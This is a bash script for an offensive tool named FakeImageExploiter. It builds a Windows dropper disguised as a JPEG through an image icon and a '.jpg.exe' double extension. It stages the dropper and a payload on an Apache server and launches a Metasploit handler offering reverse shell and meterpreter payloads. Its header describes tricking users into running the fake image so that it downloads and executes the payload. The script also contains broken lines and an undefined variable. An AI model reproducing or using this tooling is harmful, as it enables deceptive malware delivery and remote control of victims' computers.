#!/bin/bash

##
# FakeImageExploiter v1.0 - image.jpg.exe
# Version: v1.0 (Alpha)
# Author: pedro ubuntu [ r00t-3xp10it ]
# CodeName: troia_revisited
# Distros Supported : Linux Ubuntu, Kali, Mint, Parrot OS
# ---
# Description:
#   This module takes one existing image.jpg and one payload.exe (input by user) and
#   builds a new payload (evil.jpg.exe) that if executed it will trigger the download
#   of the 2 previous files stored into apache2 webserver (image.jpg + payload.exe).
#   This module also changes the payload Icon to match the input image.jpg Then uses
#   'hides known file extensions' to hidde the .exe extension (final: evil.jpg.exe) ..
#
# Exploitation:
#   evil.jpg.exe final binary should be deliver to target using social enginnering
#   (apache2) to trick user into pressing the fake_image.jpg.exe (malicious binary).
#   When executed the evil.jpg.exe will download and open the image.jpg and the
#   payload.exe from our apache2 webserver, and execute the two of them ..
# ---
# Credits: https://null-byte.wonderhowto.com/how-to/hide-virus-inside-fake-picture-0168183
# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
##



# 1 - create executable.exe
# 2 - sed and compile this file

#       10.0.0.13 - replace by - LhOsT
#       payload.exe - replace by - PaYlO
#       screenshot.jpg - replace by - ScRee
#       gcc evil.c -o evil.exe (compile to exe)

# 3 - Making the Executable 'Look' Like a Picture (resource hacker)
# 4 - Renaming the Executable (mv evil.exe evil.jpg.exe) -> (user input) 
# 5 - port the 3 files to apache2 webserver
# 6 - start a multi hadler + apache2 ..

# TODO: sed replacement (stage 2)..
# TODO: build cleanner.rc to be called in meterpreter console (manual)
#        C:\\Users\\Public\\image.jpg + payload.exe
# TODO: if does not execute payload.exe then use r3lik .txt payload ..
# ----------------------------------------------------------------------



# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}




# ---------------------
# variable declarations
# ---------------------
VeR="1.0"
ArCh=`arch`
IPATH=`pwd`
HoME=`echo ~`
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use



# ------------------------
# configuring correct arch
# ------------------------
if [ "$ArCh" = "i686" ]; then
dEd="x86"
arch="wine"
PgFi="Program Files"
else
dEd="x64"
arch="wine"           # 4w4k3 issue3 bug report
PgFi="Program Files"  # 4w4k3 issue3 bug report
fi






case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear



Colors;
echo ${YellowF}[⊶] Checking backend applications! ${Reset};
sleep 1
# ----------------------
# check for dependencies
# ----------------------
apc=`which i586-mingw32msvc-gcc`> /dev/null 2>&1
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} mingw32 installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[x]${white} This script requires mingw32 to work! ${Reset};
echo ${RedF}[x]${white} Please run: sudo apt-get install mingw32 ${Reset};
echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} mingw32 installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi


apc=`which wine`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} Wine installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[x]${white} This script requires wine to work! ${Reset};
echo ${RedF}[x]${white} Please run: sudo apt-get install wine ${Reset};
echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} Wine installation  '->' ${GreenF}found! ${Reset};
sleep 1
fi


apc=`which zenity`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} Zenity installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[x]${white} This script requires Zenity to work! ${Reset};
echo ${RedF}[x]${white} Please run: sudo apt-get install zenity ${Reset};
echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} Zenity installation'->' ${GreenF}found! ${Reset};
sleep 1
fi

apc=`which xterm`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[x]${white} Xterm installation '->' ${RedF}not found! ${Reset};
sleep 1
echo ${RedF}[x]${white} This script requires xterm to work! ${Reset};
echo ${RedF}[x]${white} Please run: sudo apt-get install xterm ${Reset};
echo ${RedF}[x]${white} to install missing dependencies... ${Reset};
exit
else
echo ${BlueF}[☆]${white} Xterm installation   '->' ${GreenF}found! ${Reset};
sleep 1
fi

if [ "$ByPa" = "NO" ]; then
  if [ -e "$HoME/.wine/drive_c/$PgFi" ]; then
    echo ${BlueF}[☆]${white} Wine Program Files  '->' ${GreenF}found! ${Reset};
    sleep 1
  else
    echo ${RedF}[x]${white} Wine Program Files '->' ${RedF}not found! ${Reset};
    echo ${RedF}[x]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
    sleep 1
    echo ${RedF}[x]${white} Please wait, running winecfg! ${Reset};
    winecfg > /dev/null 2>&1
    sleep 1
    exit
  fi
fi





# -----------------
# orginal payload full-path variable
UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --file-selection --text "chose payload to be transformed") > /dev/null 2>&1

# orginal image.jpg full-path variable
JpG=$(zenity --title "☠ IMAGE TO BE USED ☠" --filename=$IPATH --file-selection --text "chose image to use") > /dev/null 2>&1

# icon to use in evil.jpg.exe
IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "JPG-1.ico" FALSE "JPG-2.ico" FALSE "JPG-3.ico" FALSE "JPG-4.ico" FALSE "JPG-5.ico" FALSE "JPG-6.ico" FALSE "Input your own image" --width 330 --height 280) > /dev/null 2>&1

# chose to input your own image insted of a icon
if [ "$IcOn" = "Input your own image" ]; then
  ImR=$(zenity --title "☠ IMAGE TO BE USED AS ICON ☠" --filename=$IPATH --file-selection --text "chose image to use") > /dev/null 2>&1
  $PaTh = "$ImR"
else
  $PaTh = "$IPATH/icons/$IcOn"
fi

# rename your exploiter (trigger)
MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
# ------------------








cd $IPATH/bin
# build evil binary
sed "s|LhOsT|$IP|g" evil.c > evilcopy.c
sed -i "s|ScRee|$MiP.jpg|g" evilcopy.c


# COMPILING SHELLCODE USING mingw32
echo "[☠] Compiling using mingw32..."
sleep 2
i586-mingw32msvc-gcc evilcopy.c -o trigger.exe -mwindows
mv trigger.exe $IPATH/output/trigger.exe
cd $IPATH








    # check for resource hacker installation (wine)
    if [ -f "$HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe" ]; then
      echo ${BlueF}[☆]${white} ResourceHacker.exe '->' ${GreenF}found! ${Reset};
      sleep 1
    else
      echo ${RedF}[x]${white} ResourceHacker.exe '->' ${RedF} not found! ${Reset};
      sleep 1
cat << !
    Installing ResourceHacker under .wine directorys... 
    Version:windows7 Arch:$dEd Path:drive_c/$PgFi
    $HoME/.wine/drive_c/$PgFi/Resource Hacker/ResourceHacker.exe

!
      sleep 3
      xterm -T "FakeImageExploiter" -geometry 90x26 -e "$arch $IPATH/bin/reshacker_setup.exe && sleep 3"
      echo ${YellowF}[⊶]${white} Please wait, restarting tool! ${Reset};
      echo ${YellowF}[⊶]${white} For proper ResourceHacker.exe Instalation! ${Reset};
      sleep 2
      exit
    fi

      # wine command to call resourcehacker and add a MS-WORD.ico to the backdoor
      echo ${YellowF}[⊶] Working on backdoor agent! ${Reset};
      sleep 1
      echo ${BlueF}[☆]${white} Transforming backdoor agent '->' ${GreenF}done... ${Reset};
      $arch $HoME/.wine/drive_c/"$PgFi"/"Resource Hacker"/ResourceHacker.exe -open $UpL -save $IPATH/output/backdoor.exe -action addskip -res $PaTh -mask ICONGROUP,MAINICON,
      echo ${BlueF}[☆]${white} Change backdoor agent icons '->' ${GreenF}done... ${Reset};
      sleep 1
    fi


      # change extension
      mv $IPATH/output/trigger.exe  $IPATH/output/$MiP.jpg.exe > /dev/null 2>&1




    # port to apache2
    cp $UpL $ApAc/payload.exe > /dev/null 2>&1
    cp $JpG $ApAc/$MiP.jpg > /dev/null 2>&1
    cp $IPATH/output/$MiP.jpg.exe $ApAc/$MiP.jpg.exe > /dev/null 2>&1


    
  # start apace and handler
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ FakeImageExploiter ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1


xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"


